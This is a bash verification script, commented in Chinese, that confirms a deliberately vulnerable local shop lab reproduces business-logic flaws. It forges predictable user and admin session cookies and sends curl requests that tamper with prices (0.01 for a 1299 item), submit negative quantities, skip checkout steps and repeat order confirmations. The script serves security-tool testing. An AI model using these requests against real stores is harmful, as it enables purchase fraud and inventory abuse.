#!/usr/bin/env bash
# 验证靶场新增的**业务逻辑**漏洞确实可复现（价格篡改 / 负数数量 / 跳过步骤 / 重复提交）。
#
# 为什么要有这个脚本（与 verify_lab_new_vulns.sh 同一个理由）：
# 靶场是 HexHound 的能力验证集——**靶场里不成立的东西，就没资格说"我们能测"**。
# 业务逻辑漏洞尤其需要这一步：它们不吃任何 payload，只吃"服务端少了一道校验"，
# 所以"我们跑出来了"必须先用**不经 HexHound 的手工请求**证明漏洞真的在。
#
# 这里全部是**只读性质之外的、靶场自身的**状态变更（加购物车、下单），
# 靶场状态保存在内存里，且脚本结束前会用管理员接口重置——
# 不对任何真实目标产生副作用。
#
# 用法（在 WSL 里跑，靶场监听 127.0.0.1:5000）：
#   wsl -d Ubuntu-24.04 -u root -- bash /mnt/c/.../tools/verify_lab_business_logic.sh
set -uo pipefail

BASE="${1:-http://127.0.0.1:5000}"
COOKIE="$(mktemp)"
PASS=0
FAIL=0

ok()  { echo "  [OK] $1"; PASS=$((PASS + 1)); }
bad() { echo "  [XX] $1"; FAIL=$((FAIL + 1)); }

# 靶场会话令牌是可预测的（`名字:tok-名字-demo`），这里用它造一个独立会话，
# 保证脚本可重复运行、且不依赖任何真实凭据。
USER_NAME="hh-biz-${RANDOM}${RANDOM}"
printf '127.0.0.1\tFALSE\t/\tFALSE\t0\thh_session\t%s:tok-%s-demo\n' \
  "$USER_NAME" "$USER_NAME" > "$COOKIE"

ADMIN_COOKIE="$(mktemp)"
printf '127.0.0.1\tFALSE\t/\tFALSE\t0\thh_session\tadmin:tok-admin-demo\n' > "$ADMIN_COOKIE"

jget() { python3 -c "import json,sys;d=json.load(sys.stdin);print(d$1)" 2>/dev/null || echo ""; }

echo "== 靶场业务逻辑验证：${BASE} =="
echo "   会话（可预测令牌）：${USER_NAME}:tok-${USER_NAME}-demo"

# 先把商店状态重置，保证结果可重复
curl -s -b "$ADMIN_COOKIE" -X POST "${BASE}/admin/shop/reset" > /dev/null

echo
echo "[1] 价格篡改：客户端提交的 price 被服务端接受（服务端不重算）"
SERVER_PRICE="$(curl -s "${BASE}/cart" -b "$COOKIE" | head -c 1 >/dev/null; \
  curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
    -d '{"sku":"SKU-1002","qty":1}' "${BASE}/cart" | jget '["server_price"]')"
echo "     服务端单价（SKU-1002）：${SERVER_PRICE}"

ADD="$(curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"sku":"SKU-1002","qty":1,"price":0.01}' "${BASE}/cart")"
echo "     加购（声明 price=0.01）：$(echo "$ADD" | head -c 200)"

TOTAL="$(curl -s -b "$COOKIE" "${BASE}/cart/total")"
PRICED_BY="$(echo "$TOTAL" | jget '["priced_by"]')"
TOTAL_VALUE="$(echo "$TOTAL" | jget '["total"]')"
if [ "$PRICED_BY" = "client" ]; then
  ok "合计按**客户端价格**计算（priced_by=client，total=${TOTAL_VALUE}）"
else
  bad "合计没按客户端价格算：$(echo "$TOTAL" | head -c 200)"
fi
# 0.01 与 1299 的巨大差异就是漏洞的直接证据
python3 - "${TOTAL_VALUE:-0}" "${SERVER_PRICE:-0}" <<'PY'
import sys
total = float(sys.argv[1] or 0)
server = float(sys.argv[2] or 0)
if server > 0 and total < server / 100:
    print(f"  [OK] 1299 元的商品以 {total} 元成交（价格篡改成立）")
    raise SystemExit(0)
print(f"  [XX] 未观察到价格篡改：total={total} server={server}")
raise SystemExit(1)
PY
if [ "$?" -eq 0 ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi

echo
echo "[2] 负数数量：qty<0 不校验，小计变成负数"
curl -s -b "$COOKIE" -X DELETE "${BASE}/cart" > /dev/null
NEG="$(curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"sku":"SKU-1002","qty":-5,"price":1299}' "${BASE}/cart")"
NEG_QTY="$(echo "$NEG" | jget '["qty"]')"
NEG_TOTAL="$(curl -s -b "$COOKIE" "${BASE}/cart/total" | jget '["total"]')"
if [ "${NEG_QTY:-0}" -lt 0 ] 2>/dev/null; then
  ok "服务端接受了负数数量 qty=${NEG_QTY}（未做范围校验）"
else
  bad "负数数量被拒绝或未生效：$(echo "$NEG" | head -c 200)"
fi
python3 - "${NEG_TOTAL:-0}" <<'PY'
import sys
total = float(sys.argv[1] or 0)
if total < 0:
    print(f"  [OK] 购物车合计被做成负数：{total}（负数数量生效）")
    raise SystemExit(0)
print(f"  [XX] 合计不是负数：{total}")
raise SystemExit(1)
PY
if [ "$?" -eq 0 ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi

echo
echo "[3] 跳过步骤：不调 /order/prepare、不加购物车，直接 POST /order/confirm"
curl -s -b "$COOKIE" -X DELETE "${BASE}/cart" > /dev/null
SKIP="$(curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"sku":"SKU-1001","qty":1,"price":0.01}' "${BASE}/order/confirm")"
SKIP_CODE="$(echo "$SKIP" | jget '["code"]')"
SKIP_ORDER="$(echo "$SKIP" | jget '["order_id"]')"
SKIP_TOTAL="$(echo "$SKIP" | jget '["total"]')"
if [ "$SKIP_CODE" = "0" ]; then
  ok "未走 /order/prepare、购物车为空也能下单（order_id=${SKIP_ORDER}，total=${SKIP_TOTAL}）"
else
  bad "直接确认下单被拒绝（说明这一条不成立）：$(echo "$SKIP" | head -c 200)"
fi

echo
echo "[4] 重复提交：同一购物车反复确认，每次都新建订单并再扣库存"
curl -s -b "$COOKIE" -X DELETE "${BASE}/cart" > /dev/null
curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
  -d '{"sku":"SKU-1003","qty":1,"price":29}' "${BASE}/cart" > /dev/null
ORDER_IDS=""
for _ in $(seq 1 3); do
  RESP="$(curl -s -b "$COOKIE" -X POST -H 'Content-Type: application/json' \
    -d '{}' "${BASE}/order/confirm")"
  ORDER_IDS="${ORDER_IDS} $(echo "$RESP" | jget '["order_id"]')"
done
UNIQUE="$(echo "$ORDER_IDS" | tr ' ' '\n' | grep -c 'ORD-' || true)"
echo "     三次确认得到订单号：${ORDER_IDS}"
if [ "$UNIQUE" -ge 2 ]; then
  ok "同一购物车重复确认产生了 ${UNIQUE} 张不同订单（无幂等性成立）"
else
  bad "重复确认只产生 ${UNIQUE} 张订单——幂等性可能已存在"
fi

echo
echo "[5] 状态一致性：确认订单可查、库存被重复扣减"
LAST_ORDER="$(echo "$ORDER_IDS" | tr ' ' '\n' | grep 'ORD-' | tail -1)"
if [ -n "$LAST_ORDER" ]; then
  DETAIL="$(curl -s -b "$COOKIE" "${BASE}/order/${LAST_ORDER}")"
  DETAIL_ID="$(echo "$DETAIL" | jget '["data"]["order_id"]')"
  if [ "$DETAIL_ID" = "$LAST_ORDER" ]; then
    ok "订单 ${LAST_ORDER} 可查（说明订单真的落库了，不是假成功）"
  else
    bad "查不到订单 ${LAST_ORDER}：$(echo "$DETAIL" | head -c 200)"
  fi
else
  bad "没有拿到订单号"
fi

# 收尾：把靶场状态还原，避免影响后续的 agent 验证跑
curl -s -b "$ADMIN_COOKIE" -X POST "${BASE}/admin/shop/reset" > /dev/null
rm -f "$COOKIE" "$ADMIN_COOKIE"

echo
echo "== 汇总：${PASS} 项成立，${FAIL} 项异常 =="
echo "说明：本脚本只改**本地靶场内存状态**，结束前已重置；不对任何真实目标产生副作用。"
[ "$FAIL" -eq 0 ]
